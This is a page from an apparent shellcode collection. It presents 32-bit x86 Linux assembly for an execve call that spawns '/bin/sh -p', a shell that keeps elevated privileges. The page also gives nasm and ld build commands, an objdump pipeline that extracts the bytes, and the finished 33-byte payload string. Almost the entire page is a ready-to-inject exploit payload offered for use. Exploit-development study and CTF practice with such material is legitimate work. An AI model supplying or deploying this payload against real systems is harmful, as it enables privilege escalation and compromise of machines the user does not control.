---
layout: default
title: execve("/bin/sh", ["/bin/sh", "-p"], 0) - Spawn shell maintaining privileges
permalink: /shellcode/asm-02.html
os: Linux
arch: Intel x86
length: 33
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor eax, eax		; null eax
	push eax		; push null terminator
	push 0x68732f2f		; push "//sh"
	push 0x6e69622f		; push "/bin"
	mov ebx, esp		; move pointer to "/bin//sh" into ebx

	push eax		; push null terminator
	push word 0x702d	; push "-p"
	mov ecx, esp		; move pointer to "-p" into ecx

	push eax		; push null terminator
	push ecx		; push pointer to "-p"
	push ebx		; push pointer to "/bin//sh"
	mov ecx, esp		; move array of pointers {"/bin//sh", "-p"} into ecx

	xor edx, edx		; null edx
	mov al, 0xb		; move execve syscall number into al (eax)
	int 0x80		; call execve
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf -o code.o code.asm

# Link
ld -m elf_i386 -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```